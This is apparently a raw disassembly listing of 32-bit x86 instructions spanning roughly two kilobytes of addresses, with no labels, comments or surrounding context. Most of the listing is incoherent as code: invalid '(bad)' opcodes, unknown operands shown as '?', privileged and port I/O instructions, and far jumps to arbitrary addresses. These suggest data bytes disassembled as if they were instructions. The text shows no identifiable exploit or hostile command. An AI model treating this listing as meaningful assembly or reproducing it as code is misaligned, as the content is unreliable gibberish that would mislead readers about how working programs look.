  4159ac:	repz je 0x4159c7
  4159af:	push   ds
  4159b0:	pop    edi
  4159b1:	mov    eax,0x68a21217
  4159b6:	das    
  4159b7:	mov    esp,0x50bf0555
  4159bc:	inc    ecx
  4159bd:	push   eax
  4159be:	jae    0x4159ba
  4159c0:	je     0x415a31
  4159c2:	push   0x5aa0885e
  4159c7:	xor    cl,BYTE PTR [esi]
  4159c9:	dec    BYTE PTR [edx+eax*8-0xc]
  4159cd:	or     dl,cl
  4159cf:	mov    edi,0xab91d9ab
  4159d4:	js     0x41598c
  4159d6:	add    al,0xf1
  4159d8:	outs   dx,DWORD PTR ds:[esi]
  4159d9:	mov    ah,0x91
  4159db:	pop    ebp
  4159dc:	mov    ?,WORD PTR [ebp+0x54f09991]
  4159e2:	ins    BYTE PTR es:[edi],dx
  4159e3:	mov    BYTE PTR [edx],ah
  4159e5:	mov    ds,WORD PTR [edx+0x2861771d]
  4159eb:	jnp    0x415a4f
  4159ed:	packsswb mm3,mm6
  4159f0:	add    DWORD PTR [ebx-0x28],edi
  4159f3:	sbb    BYTE PTR [edi-0x2c],ch
  4159f6:	sbb    ch,BYTE PTR [esi+0x2ee4f8f2]
  4159fc:	dec    edx
  4159fd:	sub    eax,0x33aec879
  415a02:	and    eax,0xa4aa6344
  415a07:	and    dl,BYTE PTR [esi]
  415a09:	jge    0x41599f
  415a0b:	dec    edi
  415a0c:	pop    ecx
  415a0d:	scas   al,BYTE PTR es:[edi]
  415a0e:	mov    ds:0xe64d1307,al
  415a13:	imul   esp,DWORD PTR [eax],0x3f
  415a16:	imul   ebp,DWORD PTR [eax],0x9
  415a19:	ja     0x4159d6
  415a1b:	mov    BYTE PTR [ebx-0x51],ah
  415a1e:	call   0x5b43af62
  415a23:	mov    eax,0x2b1d6e
  415a28:	mov    eax,0xf66147e1
  415a2d:	mov    bh,0x4e
  415a2f:	dec    esi
  415a30:	pop    eax
  415a31:	pop    esi
  415a32:	loope  0x415a77
  415a34:	in     al,0x4a
  415a36:	push   cs
  415a37:	scas   eax,DWORD PTR es:[edi]
  415a38:	clc    
  415a39:	lahf   
  415a3a:	or     bh,BYTE PTR [edi]
  415a3c:	jno    0x415a4b
  415a3e:	mov    BYTE PTR [ecx-0x501db52b],bh
  415a44:	test   DWORD PTR [ecx],esi
  415a46:	arpl   bx,si
  415a48:	cdq    
  415a49:	cs pop ebx
  415a4b:	sub    BYTE PTR [edi],0xc0
  415a4e:	xor    DWORD PTR [esi+ecx*1+0x1ef42b0b],esi
  415a55:	and    al,0x2b
  415a57:	sbb    bl,BYTE PTR [edx-0x76ade338]
  415a5d:	fistp  QWORD PTR [edx]
  415a5f:	idiv   DWORD PTR [esi-0x36]
  415a62:	repnz (bad) 
  415a64:	cmp    BYTE PTR [ebp+0x417ad2ed],bl
  415a6a:	arpl   WORD PTR [ebp+0x77],cx
  415a6d:	push   edx
  415a6e:	lea    esp,[edi-0x38]
  415a71:	cmc    
  415a72:	dec    ebx
  415a73:	mov    ds:0x364d7c7c,al
  415a78:	pusha  
  415a79:	out    dx,al
  415a7a:	(bad)  
  415a7c:	and    eax,0xc07d8875
  415a81:	add    ecx,esi
  415a83:	jne    0x4136c2
  415a89:	mov    ecx,DWORD PTR [ebp-0x20]
  415a8c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  415a93:	mov    dl,BYTE PTR [ebp-0x1]
  415a96:	cmp    cl,dl
  415a98:	je     0x420d32
  415a9e:	jmp    0x417e2b
  415aa3:	jb     0x415a63
  415aa5:	or     eax,0x7679f979
  415aaa:	mov    eax,ds:0xde6af8ab
  415aaf:	push   edi
  415ab0:	retf   0x7871
  415ab3:	dec    esi
  415ab4:	push   edi
  415ab5:	jge    0x415b31
  415ab7:	or     bl,BYTE PTR [edi+0x7a]
  415aba:	jp     0x415ae4
  415abc:	data16 daa 
  415abe:	in     al,dx
  415abf:	add    al,0x35
  415ac1:	xchg   edi,eax
  415ac2:	call   0xacac:0xdda2c09a
  415ac9:	xchg   ebp,eax
  415aca:	push   es
  415acb:	or     DWORD PTR ds:[esi+0x7cc51aa2],eax
  415ad2:	out    dx,al
  415ad3:	lock mov edx,0x729ad2bb
  415ad9:	jno    0x415afd
  415adb:	jae    0x415a66
  415add:	aaa    
  415ade:	fcomp  QWORD PTR [edx+0x7d6ebc4f]
  415ae4:	sbb    esi,DWORD PTR ds:0xdd376fd6
  415aea:	mov    ds:0x66f346a9,eax
  415af0:	fstp   DWORD PTR [edi-0x42b2f8d8]
  415af6:	nop
  415af7:	pop    ebx
  415af8:	mov    eax,0x7162fbc9
  415afd:	stos   BYTE PTR es:[edi],al
  415afe:	das    
  415aff:	scas   al,BYTE PTR es:[edi]
  415b00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b01:	or     BYTE PTR [ebx-0x20448ab3],bl
  415b07:	mov    cl,ch
  415b09:	push   esp
  415b0a:	neg    DWORD PTR [esp+eax*1-0x50a6f20c]
  415b11:	mov    esp,0xa35d52a4
  415b16:	loopne 0x415b47
  415b18:	sti    
  415b19:	jne    0x415b70
  415b1b:	or     al,0xce
  415b1d:	pop    ecx
  415b1e:	and    al,0xc8
  415b20:	test   BYTE PTR [edx],dl
  415b22:	into   
  415b23:	gs pop ecx
  415b25:	sbb    eax,0x75fbb735
  415b2a:	mov    eax,ds:0x43bb34b8
  415b2f:	ins    DWORD PTR es:[edi],dx
  415b30:	dec    edi
  415b31:	out    dx,al
  415b32:	adc    dl,BYTE PTR [edi]
  415b34:	mov    eax,0xea72556f
  415b39:	cmp    eax,0xb55689e7
  415b3e:	jae    0x415af9
  415b40:	push   esi
  415b41:	cmp    ch,BYTE PTR [esi+0x8]
  415b44:	adc    ebx,DWORD PTR [ebp+0x79]
  415b47:	std    
  415b48:	xchg   esp,eax
  415b49:	enter  0x520c,0xb6
  415b4d:	jns    0x415bb3
  415b4f:	jns    0x415af6
  415b51:	push   cs
  415b52:	cmp    BYTE PTR [esp+eax*1],0x9d
  415b56:	add    DWORD PTR cs:[edi+0x63],eax
  415b5a:	adc    cl,BYTE PTR [ebp+0x436a6523]
  415b60:	sbb    al,0x32
  415b62:	jle    0x415afd
  415b64:	dec    ebp
  415b65:	daa    
  415b66:	pop    ecx
  415b67:	inc    edi
  415b68:	push   0x5c7826e2
  415b6d:	jmp    0x8d9b2b82
  415b72:	xor    DWORD PTR [edi-0x7c109c85],edi
  415b78:	mov    BYTE PTR [edx-0x70],cl
  415b7b:	(bad)  
  415b7c:	rcl    ebx,1
  415b7e:	cmc    
  415b7f:	cld    
  415b80:	mov    dh,0x74
  415b82:	cmp    ch,BYTE PTR [eax-0x43]
  415b85:	jbe    0x415b62
  415b87:	pop    esi
  415b88:	jae    0x415b37
  415b8a:	fist   WORD PTR [eax]
  415b8c:	sbb    al,0x72
  415b8e:	mov    ds:0xf2f420c8,eax
  415b93:	stc    
  415b94:	xor    BYTE PTR [edi+0x5f],bh
  415b97:	mov    cl,0x3d
  415b99:	fsubr  st(7),st
  415b9b:	pop    ds
  415b9c:	ins    DWORD PTR es:[edi],dx
  415b9d:	and    BYTE PTR [ebx-0x4d],0xfc
  415ba1:	inc    edx
  415ba2:	sti    
  415ba3:	push   esp
  415ba4:	sti    
  415ba5:	dec    esi
  415ba6:	mov    ah,0xa
  415ba8:	daa    
  415ba9:	dec    ebx
  415baa:	in     al,dx
  415bab:	xchg   edx,eax
  415bac:	xchg   cl,dl
  415bae:	es mov bh,0xde
  415bb1:	retf   
  415bb2:	dec    esi
  415bb3:	lahf   
  415bb4:	shl    DWORD PTR [edx],cl
  415bb6:	fsubr  DWORD PTR [ebx]
  415bb8:	mov    edi,0x3242f920
  415bbd:	aaa    
  415bbe:	add    BYTE PTR [ecx],cl
  415bc0:	add    cl,BYTE PTR [edx-0xf1155d7]
  415bc6:	adc    al,0x10
  415bc8:	not    DWORD PTR [eax*1-0x3299945]
  415bcf:	push   esp
  415bd0:	xchg   ecx,eax
  415bd1:	jmp    0x415b65
  415bd3:	push   eax
  415bd4:	neg    BYTE PTR [esi]
  415bd6:	push   edx
  415bd7:	or     al,0x88
  415bd9:	sar    DWORD PTR [ecx],cl
  415bdb:	sub    DWORD PTR [esi],edi
  415bdd:	sbb    al,0x55
  415bdf:	jle    0x415c02
  415be1:	xor    DWORD PTR [esi+0x4f],ecx
  415be4:	addr16 or al,0x6c
  415be7:	outs   dx,DWORD PTR ds:[esi]
  415be8:	or     al,ah
  415bea:	lods   eax,DWORD PTR ds:[esi]
  415beb:	mov    ecx,0xe60d4d58
  415bf0:	mov    ds,esp
  415bf2:	push   edi
  415bf3:	pop    es
  415bf4:	stc    
  415bf5:	mov    ebp,0x688e8f0d
  415bfa:	cmp    al,0xc2
  415bfc:	dec    eax
  415bfd:	retf   0xc995
  415c00:	scas   eax,DWORD PTR es:[edi]
  415c01:	cmp    BYTE PTR [eax-0x59bf3418],dl
  415c07:	lgdtd  [ebx-0x28a0a801]
  415c0e:	push   0xfffffff9
  415c10:	push   eax
  415c11:	fucomip st,st(5)
  415c13:	ins    BYTE PTR es:[edi],dx
  415c14:	sar    DWORD PTR [ecx+0x5b],1
  415c17:	mov    dh,0x38
  415c19:	scas   eax,DWORD PTR es:[edi]
  415c1a:	inc    edx
  415c1b:	repnz std 
  415c1d:	pop    ebx
  415c1e:	dec    ecx
  415c1f:	out    0xd1,eax
  415c21:	xor    DWORD PTR [ebx],ebx
  415c23:	inc    edi
  415c24:	pop    ss
  415c25:	dec    ebp
  415c26:	arpl   WORD PTR [esi-0x3a],sp
  415c29:	inc    edx
  415c2a:	jmp    0x415c03
  415c2c:	iret   
  415c2d:	or     BYTE PTR [esi-0xe],ch
  415c30:	jne    0x415c7b
  415c32:	adc    DWORD PTR [edi],edi
  415c34:	scas   al,BYTE PTR es:[edi]
  415c35:	rcl    DWORD PTR [edi-0x7c42d78],0xc9
  415c3c:	les    esi,FWORD PTR [ebx-0x55]
  415c3f:	out    dx,eax
  415c40:	test   eax,0xde21df4c
  415c45:	push   eax
  415c46:	cwde   
  415c47:	adc    eax,0x2411d9bf
  415c4c:	push   0x7fabcacf
  415c51:	push   ebp
  415c52:	xor    ebp,esi
  415c54:	jp     0x415c7b
  415c56:	test   al,0xf
  415c58:	cmp    DWORD PTR [ecx+0x55517f54],esp
  415c5e:	aam    0xe1
  415c60:	jecxz  0x415cac
  415c62:	xlat   BYTE PTR ds:[ebx]
  415c63:	fs pop ecx
  415c65:	mov    ch,BYTE PTR [eax]
  415c67:	shr    BYTE PTR [esi+0x31de91cc],1
  415c6d:	push   esp
  415c6e:	sub    edi,DWORD PTR [ecx+ecx*2+0x700aebdc]
  415c75:	scas   al,BYTE PTR es:[edi]
  415c76:	cs jnp 0x415c39
  415c79:	(bad)  
  415c7a:	or     al,0x6c
  415c7c:	inc    esp
  415c7d:	ins    BYTE PTR es:[edi],dx
  415c7e:	xchg   esi,eax
  415c7f:	add    esi,esi
  415c81:	pop    esi
  415c82:	outs   dx,DWORD PTR ds:[esi]
  415c83:	test   BYTE PTR [edi-0x4854bcc7],ch
  415c89:	imul   esp,DWORD PTR ds:0x80adfc7a,0xffffffc8
  415c90:	test   BYTE PTR [edi+0x42dcef53],0x44
  415c97:	mov    dh,0x3e
  415c99:	je     0x415c4c
  415c9b:	aas    
  415c9c:	or     edx,esi
  415c9e:	mov    ebx,0xfa093004
  415ca3:	retf   
  415ca4:	daa    
  415ca5:	mov    al,ds:0x2c0b8016
  415caa:	mov    ebx,esp
  415cac:	das    
  415cad:	mov    ebx,0xa2a2bc68
  415cb2:	in     al,dx
  415cb3:	dec    edi
  415cb4:	adc    BYTE PTR [eax],ah
  415cb6:	mov    ah,0xfc
  415cb8:	or     al,0xdb
  415cba:	inc    eax
  415cbb:	mov    ebx,0xce97c161
  415cc0:	dec    edi
  415cc1:	dec    ebx
  415cc2:	jae    0x415ca8
  415cc4:	test   DWORD PTR [ebx-0x684d8b1a],eax
  415cca:	out    0xc7,eax
  415ccc:	nop
  415ccd:	lods   eax,DWORD PTR ds:[esi]
  415cce:	ja     0x415d2a
  415cd0:	out    0x24,al
  415cd2:	out    dx,eax
  415cd3:	pop    edi
  415cd4:	shl    BYTE PTR [esi+0xb1ceeca],1
  415cda:	test   eax,0xcc0f1415
  415cdf:	and    esp,DWORD PTR [edx]
  415ce1:	sbb    edi,DWORD PTR [eax+0x114bf55e]
  415ce7:	add    edx,0x61
  415cea:	jle    0x415d2e
  415cec:	in     al,0xef
  415cee:	pop    ds
  415cef:	cmp    eax,0x238911ce
  415cf4:	ja     0x415cd0
  415cf6:	add    DWORD PTR [edi-0x51],ecx
  415cf9:	out    0x7d,eax
  415cfb:	and    al,0xed
  415cfd:	in     al,0x44
  415cff:	add    BYTE PTR [esi+0x43],dl
  415d02:	push   0x93fadb8
  415d07:	into   
  415d08:	mov    cl,BYTE PTR [edx]
  415d0a:	and    BYTE PTR [edi],dl
  415d0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d0d:	or     al,0x5
  415d0f:	or     esi,eax
  415d11:	dec    ebp
  415d12:	mov    dh,0x22
  415d14:	mov    eax,ds:0xcb209794
  415d19:	pop    edx
  415d1a:	aam    0x1e
  415d1c:	push   0xb650cb12
  415d21:	iret   
  415d22:	repnz push edi
  415d24:	dec    esi
  415d25:	adc    BYTE PTR [ecx],0xbf
  415d28:	push   ss
  415d29:	jp     0x415d17
  415d2b:	mov    gs,WORD PTR ds:0xc8cc4d51
  415d31:	push   edx
  415d32:	icebp  
  415d33:	mov    al,ds:0x677c530c
  415d38:	pusha  
  415d39:	adc    dl,0xa2
  415d3c:	leave  
  415d3d:	mov    ds:0x192eb0c6,eax
  415d42:	mov    al,BYTE PTR [ebp+ecx*8+0x57]
  415d46:	add    dh,BYTE PTR fs:[ebx-0x1f570364]
  415d4d:	popf   
  415d4e:	adc    ebx,DWORD PTR [ebp-0x21]
  415d51:	mov    edx,0x700ef0a8
  415d56:	pop    ss
  415d57:	ss sub al,bh
  415d5a:	shl    DWORD PTR [eax+0xa],1
  415d5d:	fcomi  st,st(3)
  415d5f:	inc    esp
  415d60:	sub    esp,esp
  415d62:	push   0x4d
  415d64:	add    dl,BYTE PTR [ebx-0x16]
  415d67:	popa   
  415d68:	das    
  415d69:	outs   dx,BYTE PTR ds:[esi]
  415d6a:	scas   al,BYTE PTR es:[edi]
  415d6b:	mov    ebx,0xa586c1c6
  415d70:	and    eax,DWORD PTR [ebx]
  415d72:	test   al,0xcb
  415d74:	jno    0x415d25
  415d76:	dec    edi
  415d77:	loopne 0x415d08
  415d79:	es mov ah,0x7c
  415d7c:	pop    ds
  415d7d:	pop    bx
  415d7f:	ins    BYTE PTR es:[edi],dx
  415d80:	or     al,0x6
  415d83:	push   cs
  415d84:	jae    0x415d1f
  415d86:	loope  0x415de0
  415d88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d89:	ror    DWORD PTR [edx+0x6c957ebc],cl
  415d8f:	mov    eax,ds:0xee9ee516
  415d94:	cmp    ch,dl
  415d96:	dec    esi
  415d97:	fldcw  WORD PTR [ebp-0x532319ed]
  415d9d:	popf   
  415d9e:	aad    0x52
  415da0:	lods   al,BYTE PTR ds:[esi]
  415da1:	repnz loope 0x415d3e
  415da4:	cwde   
  415da5:	(bad)  
  415da6:	std    
  415da7:	sar    DWORD PTR [esi-0x7],0x29
  415dab:	mov    fs,esi
  415dad:	push   ss
  415dae:	adc    al,0x57
  415db0:	inc    ebx
  415db1:	std    
  415db2:	cli    
  415db3:	adc    BYTE PTR [eax],ah
  415db5:	gs sbb BYTE PTR fs:[ebx+0x14be5ccd],cl
  415dbd:	mov    bh,0x26
  415dbf:	xchg   esp,eax
  415dc0:	cmc    
  415dc1:	or     eax,0x7686f83e
  415dc6:	pusha  
  415dc7:	fcomp  QWORD PTR [edx+0x31]
  415dca:	cmp    eax,0x590cd92e
  415dcf:	fisttp WORD PTR [ebx-0x15ee0d3]
  415dd5:	add    BYTE PTR [esi],0x54
  415dd8:	jp     0x415da1
  415dda:	je     0x415df3
  415ddc:	in     eax,dx
  415ddd:	mov    ds:0xb3e667f0,eax
  415de2:	(bad)  
  415de3:	adc    esi,DWORD PTR [ecx]
  415de5:	je     0x415dca
  415de7:	es xchg esp,eax
  415de9:	cmp    eax,0x75a2a53f
  415dee:	iret   
  415def:	adc    ecx,ecx
  415df1:	and    ch,ch
  415df3:	xchg   edx,eax
  415df4:	aam    0x81
  415df6:	dec    edi
  415df7:	into   
  415df8:	lea    esi,[ebp+0x2d]
  415dfb:	fcmovne st,st(5)
  415dfd:	dec    esi
  415dfe:	fsub   DWORD PTR [edi]
  415e00:	icebp  
  415e01:	cmc    
  415e02:	popa   
  415e03:	fisub  WORD PTR [ebp+0x1cbd9694]
  415e09:	inc    eax
  415e0a:	jmp    0x1617:0x78a9e188
  415e11:	xchg   esi,eax
  415e12:	jne    0x415de1
  415e14:	nop
  415e15:	sar    DWORD PTR [edi],cl
  415e17:	pop    esi
  415e18:	test   BYTE PTR [eax-0x17fd027],ah
  415e1e:	retf   
  415e1f:	imul   ebp,DWORD PTR [esi],0x9987f8b2
  415e25:	push   ecx
  415e26:	pop    ebx
  415e27:	or     DWORD PTR [ebp+0x57],ebx
  415e2a:	aaa    
  415e2b:	ds mov ah,bh
  415e2e:	cmp    ecx,ebx
  415e30:	inc    edi
  415e31:	not    DWORD PTR [ebx+0x6f]
  415e34:	stos   DWORD PTR es:[edi],eax
  415e35:	mov    ecx,0x7f0e8728
  415e3a:	(bad)  
  415e3b:	into   
  415e3c:	jecxz  0x415e81
  415e3e:	mov    al,0x6a
  415e40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e41:	lahf   
  415e42:	add    dl,BYTE PTR [ebx+edx*2-0x3ab28818]
  415e49:	stc    
  415e4a:	or     BYTE PTR [esp+ebp*4-0x15],0xbc
  415e4f:	mov    al,0xf7
  415e51:	enter  0xd109,0x9b
  415e55:	stos   DWORD PTR es:[edi],eax
  415e56:	imul   eax,DWORD PTR [esi+0x4a],0xc26561d7
  415e5d:	inc    ebx
  415e5e:	lahf   
  415e5f:	pop    edx
  415e60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e61:	mov    gs,WORD PTR [edi]
  415e63:	mov    esi,0xe2755b65
  415e68:	or     al,0xc7
  415e6a:	sub    eax,0x3f79a7fd
  415e6f:	mov    edi,0xe8f382f1
  415e74:	adc    al,0x1d
  415e76:	in     al,dx
  415e77:	mov    WORD PTR [esi],?
  415e79:	jmp    0x68bc:0xe871262d
  415e80:	adc    esi,DWORD PTR [ebp+0x2c]
  415e83:	push   ds
  415e84:	inc    ecx
  415e85:	jmp    0x55fdeb3b
  415e8a:	jne    0x415e5d
  415e8c:	test   ch,al
  415e8e:	pop    es
  415e8f:	or     eax,0x2a427a0a
  415e94:	mov    edx,0xc530570f
  415e99:	sub    BYTE PTR [edi+0x43],ah
  415e9c:	pop    ebp
  415e9d:	or     eax,DWORD PTR [eax]
  415e9f:	shl    DWORD PTR [ebx+0x13],0x32
  415ea3:	arpl   WORD PTR [ebx],cx
  415ea5:	lahf   
  415ea6:	adc    DWORD PTR [esi+esi*4-0x27],esi
  415eaa:	or     eax,0x46110e78
  415eaf:	sbb    eax,0x7f8a2adc
  415eb4:	fsub   QWORD PTR [edi-0x2a8e99b2]
  415eba:	test   eax,0x6c67ad74
  415ebf:	sbb    eax,edi
  415ec1:	ret    0x716
  415ec4:	or     ebx,DWORD PTR [ecx+0x1c]
  415ec7:	cli    
  415ec8:	push   cs
  415ec9:	jg     0x415ecc
  415ecb:	ffreep st(1)
  415ecd:	loop   0x415e81
  415ecf:	lds    edx,FWORD PTR [ecx+0x0]
  415ed2:	into   
  415ed3:	ins    BYTE PTR es:[edi],dx
  415ed4:	mov    gs:0xd3da2e32,al
  415eda:	aad    0xeb
  415edc:	add    DWORD PTR [ecx-0x1fb074ac],esp
  415ee2:	dec    eax
  415ee3:	xor    al,0x2b
  415ee5:	dec    ebx
  415ee6:	push   eax
  415ee7:	mov    eax,0x16e9a085
  415eec:	lds    esi,FWORD PTR [ecx+0x563b5f75]
  415ef2:	pop    eax
  415ef3:	scas   eax,DWORD PTR es:[edi]
  415ef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ef5:	idiv   DWORD PTR [esi]
  415ef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ef8:	cli    
  415ef9:	jl     0x415f21
  415efb:	or     al,0x7c
  415efd:	pop    edi
  415efe:	jb     0x415f77
  415f00:	add    eax,0x23b01c6f
  415f05:	(bad)  
  415f06:	out    dx,al
  415f07:	(bad)
  415f0a:	cld    
  415f0b:	call   0x5079a700
  415f10:	(bad)  
  415f11:	out    0xcd,eax
  415f13:	dec    ebx
  415f14:	inc    ebp
  415f15:	xchg   esp,eax
  415f16:	lods   eax,DWORD PTR ds:[esi]
  415f17:	mov    dh,0x67
  415f19:	std    
  415f1a:	and    BYTE PTR [ebp-0x21973b52],al
  415f20:	add    edx,0x21
  415f23:	dec    ecx
  415f24:	pop    edi
  415f25:	add    cl,ah
  415f27:	fidiv  DWORD PTR [edx]
  415f29:	imul   eax,ebp,0x44
  415f2c:	mov    dh,0xfe
  415f2e:	rol    BYTE PTR [ecx-0x3b],0xbd
  415f32:	sub    al,0xff
  415f34:	xchg   DWORD PTR [ebx+0x6d6080f5],edi
  415f3a:	and    DWORD PTR [ebx-0x6d],ebx
  415f3d:	xor    eax,0xc8371953
  415f42:	test   eax,0x84e3f5b5
  415f47:	iret   
  415f48:	sbb    bh,ah
  415f4a:	or     eax,0x6a5a99f8
  415f4f:	pop    es
  415f50:	out    0x2b,al
  415f52:	stc    
  415f53:	mov    edi,0x2b9e3c09
  415f58:	mov    esp,0xbae6a482
  415f5d:	sbb    bl,BYTE PTR [eax-0x5a8a62c2]
  415f63:	pop    esp
  415f64:	loopne 0x415f5f
  415f66:	outs   dx,BYTE PTR ds:[esi]
  415f67:	mov    edx,0x98f96c2a
  415f6c:	(bad)  
  415f6d:	fisttp QWORD PTR [eax-0x8b126d]
  415f73:	push   ss
  415f74:	fadd   DWORD PTR [edi+0x2298033e]
  415f7a:	cwde   
  415f7b:	nop
  415f7c:	mov    al,BYTE PTR [edi-0x62]
  415f7f:	xchg   dl,bl
  415f81:	into   
  415f82:	inc    ebx
  415f83:	rol    DWORD PTR [ebp+0x1dade7cc],cl
  415f89:	dec    ebx
  415f8a:	lods   al,BYTE PTR ds:[esi]
  415f8b:	xchg   ecx,eax
  415f8c:	nop
  415f8d:	es sub al,0x90
  415f90:	sub    DWORD PTR [ebx],esp
  415f92:	fdivr  st(7),st
  415f94:	ins    BYTE PTR es:[edi],dx
  415f95:	pop    esi
  415f96:	loopne 0x415fb7
  415f98:	push   ss
  415f99:	adc    DWORD PTR [ecx+0x6e],ebx
  415f9c:	ds out 0x7f,eax
  415f9f:	mov    DWORD PTR [eax-0x20],eax
  415fa2:	jae    0x415f8d
  415fa4:	dec    ebp
  415fa5:	cmp    eax,0x90db3138
  415faa:	mov    dh,0x3d
  415fac:	jb     0x41602c
  415fae:	pop    edx
  415faf:	popa   
  415fb0:	sub    al,0x80
  415fb2:	frstor [edi-0x3f1b6c36]
  415fb8:	data16 mov al,ds:0x98769c0d
  415fbe:	mov    bh,0x99
  415fc0:	mov    DWORD PTR [esi],edx
  415fc2:	cmp    DWORD PTR [edx-0x41],edx
  415fc5:	pop    ebp
  415fc6:	call   0xdd1f:0x7318fc5f
  415fcd:	cmp    DWORD PTR [ecx-0x4b778eda],ecx
  415fd3:	push   esi
  415fd4:	sti    
  415fd5:	dec    ebp
  415fd6:	sub    bh,BYTE PTR [edx-0x6e9e05]
  415fdc:	(bad)  
  415fdd:	aas    
  415fde:	mov    eax,eax
  415fe0:	scas   eax,DWORD PTR es:[edi]
  415fe1:	mov    BYTE PTR [eax],bl
  415fe3:	aad    0x57
  415fe5:	fistp  QWORD PTR [ebx]
  415fe7:	xor    eax,DWORD PTR [edi-0x77]
  415fea:	inc    edx
  415feb:	push   esp
  415fec:	fwait
  415fed:	pop    ebx
  415fee:	retf   
  415fef:	xchg   ebx,eax
  415ff0:	ret    
  415ff1:	or     ebp,edx
  415ff3:	cmp    esp,DWORD PTR [esi-0x49]
  415ff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ff7:	bound  eax,QWORD PTR [ecx-0x53]
  415ffa:	mul    DWORD PTR ds:[eax]
  415ffd:	jb     0x415fbb
  415fff:	jmp    0x3384171d
  416004:	and    al,0x3e
  416006:	dec    ebp
  416007:	das    
  416008:	mov    edx,0x86b7d831
  41600d:	test   al,bl
  41600f:	rcr    ebp,1
  416011:	cld    
  416012:	out    0xee,al
  416014:	mov    ebx,ebp
  416016:	jne    0x416020
  416018:	mov    edi,0x241fa19c
  41601d:	dec    eax
  41601e:	outs   dx,BYTE PTR ds:[esi]
  41601f:	dec    ecx
  416020:	sbb    DWORD PTR [eax+0x12c1c500],0xffffffe5
  416027:	xchg   esp,eax
  416028:	sub    al,0xf
  41602a:	aas    
  41602b:	test   BYTE PTR [esi-0x30],0x36
  41602f:	ss fadd QWORD PTR es:[ecx]
  416033:	rcl    DWORD PTR [esi-0x3ad1fe7e],0x20
  41603a:	inc    edx
  41603b:	mov    dl,0x48
  41603d:	das    
  41603e:	fs out 0x87,eax
  416041:	and    BYTE PTR [ecx+0x7bd126b0],cl
  416047:	nop
  416048:	inc    ebp
  416049:	imul   edi,DWORD PTR [edi+0x21],0xb69dc821
  416050:	iret   
  416051:	push   0x19
  416053:	add    ebp,esi
  416055:	aad    0x33
  416057:	pop    ds
  416058:	cld    
  416059:	sub    DWORD PTR [edx-0x4e39dfff],ebx
  41605f:	jp     0x41608c
  416061:	and    ebx,DWORD PTR [eax+ebp*2+0x702cd7a8]
  416068:	shr    DWORD PTR [esi],cl
  41606a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41606b:	div    BYTE PTR [esi]
  41606d:	cmp    edx,edx
  41606f:	pop    ebp
  416070:	pop    edx
  416071:	pushf  
  416072:	je     0x416076
  416074:	mov    ah,0x47
  416076:	sub    edx,DWORD PTR [ebx+0x5363c07]
  41607c:	ins    BYTE PTR es:[edi],dx
  41607d:	add    edx,DWORD PTR [esi-0x15]
  416080:	inc    BYTE PTR [ebp-0x580aaac]
  416086:	sar    BYTE PTR [esi+0xd],1
  416089:	sub    ecx,ebx
  41608b:	test   eax,0xdeae936e
  416090:	leave  
  416091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416092:	loopne 0x416019
  416094:	sbb    esi,DWORD PTR [esi+0xb]
  416097:	adc    al,0x11
  416099:	sbb    edi,esp
  41609b:	push   cs
  41609c:	ins    BYTE PTR es:[edi],dx
  41609d:	jns    0x41603d
  41609f:	aam    0x86
  4160a1:	sbb    eax,0x1c147f46
  4160a6:	inc    esi
  4160a7:	cld    
  4160a8:	mov    ecx,0xbff53f55
  4160ad:	dec    ecx
  4160ae:	sbb    BYTE PTR [ebx-0x76],al
  4160b1:	xchg   esp,eax
  4160b2:	or     BYTE PTR [edx+eiz*2],dl
  4160b5:	sbb    esi,DWORD PTR [edx+0x4dc588d2]
  4160bb:	or     ah,BYTE PTR ds:0xee969d7
  4160c1:	cli    
  4160c2:	xchg   ecx,eax
  4160c3:	imul   ecx,DWORD PTR [ebx+0xe],0x58
  4160c7:	pop    ecx
  4160c8:	jns    0x41607c
  4160ca:	or     eax,0xfa7db9c0
  4160cf:	pop    ecx
  4160d0:	loop   0x41611f
  4160d2:	loop   0x4160ef
  4160d4:	xor    esi,DWORD PTR [ebx]
  4160d6:	mov    ch,0x52
  4160d8:	sahf   
  4160d9:	pusha  
  4160da:	loope  0x4160e6
  4160dc:	xchg   BYTE PTR [ebx+0x191e6c59],dh
  4160e2:	sbb    al,0x57
  4160e4:	es imul dl
  4160e7:	push   esp
  4160e8:	in     al,dx
  4160e9:	dec    ecx
  4160ea:	adc    al,0xa
  4160ec:	push   0x73a51af1
  4160f1:	bound  esp,QWORD PTR [ecx-0x2a955e00]
  4160f7:	sub    esp,edx
  4160f9:	adc    bh,BYTE PTR [ebp+edx*8-0x150c468]
  416100:	dec    edi
  416101:	data16 jle 0x41611a
  416104:	out    0xca,al
  416106:	leave  
  416107:	dec    edi
  416108:	outs   dx,DWORD PTR ds:[esi]
  416109:	sub    ah,BYTE PTR [eax]
  41610b:	sbb    eax,0x745e514a
  416110:	pop    edx
  416111:	cld    
  416112:	shl    DWORD PTR [esi-0x4b],0x3b
  416116:	(bad)  
  416117:	sti    
  416118:	inc    edi
  416119:	loopne 0x4160a0
  41611b:	shr    ebx,cl
  41611d:	nop
  41611e:	popf   
  41611f:	pop    eax
  416120:	pop    edi
  416121:	xchg   DWORD PTR [esi+esi*1-0x55],esi
  416125:	xchg   BYTE PTR [edx+edx*2+0x23],bh
  416129:	xlat   BYTE PTR ds:[ebx]
  41612a:	or     edx,ebp
  41612c:	xor    DWORD PTR [ecx+eiz*1],ebp
  41612f:	fidiv  WORD PTR gs:[ebx+0x65496da6]
  416136:	adc    edi,DWORD PTR [esi-0x1e]
  416139:	aam    0x1c
  41613b:	dec    ecx
  41613c:	mov    cl,0x71
  41613e:	adc    BYTE PTR [edi+0x5e6f5111],ah
  416144:	mov    cl,BYTE PTR [ebx]
  416146:	cwde   
  416147:	imul   eax,DWORD PTR [ebx],0x3020cfcf
  41614d:	mov    esi,0x5973f3e8
  416152:	mov    al,0x7a
  416154:	cli    
  416155:	mov    dl,0xb
  416157:	cdq    
  416158:	dec    esi
  416159:	dec    esp
  41615a:	sbb    esi,DWORD PTR [eax]
